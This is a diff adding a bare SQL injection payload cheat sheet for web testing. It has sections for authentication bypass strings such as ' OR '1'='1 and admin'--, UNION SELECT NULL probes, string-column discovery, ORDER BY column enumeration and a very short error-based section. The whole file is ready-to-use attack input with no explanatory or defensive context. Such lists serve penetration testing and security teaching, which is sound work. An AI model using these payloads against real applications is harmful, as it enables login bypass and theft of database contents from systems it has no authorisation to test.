@@ -1,0 +1,26 @@
+Authentication Bypass
+
+' OR '1'='1
+' OR 1=1-- 
+admin'--
+
+UNION-Based SQLi
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+Find String-Compatible Column
+
+' UNION SELECT NULL,'abc',NULL--
+
+ORDER BY Column Enumeration
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+
+Error-Based Testing
+
+' ")
